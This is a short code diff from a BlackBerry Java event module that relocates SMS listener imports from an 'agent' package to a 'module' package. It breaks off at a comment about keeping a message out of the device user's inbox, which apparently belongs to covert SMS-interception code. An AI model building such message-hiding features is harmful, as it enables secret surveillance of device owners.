@@ -11,14 +11,14 @@ package blackberry.event;
 import javax.microedition.io.DatagramConnection;
 import javax.wireless.messaging.MessageConnection;
 
-import blackberry.agent.sms.SmsListener;
-import blackberry.agent.sms.SmsListener45;
-import blackberry.agent.sms.SmsListener46;
 import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
+import blackberry.module.sms.SmsListener;
+import blackberry.module.sms.SmsListener45;
+import blackberry.module.sms.SmsListener46;
 
 /**
  * To prevent this message from appearing in the BlackBerry device user’s inbox,
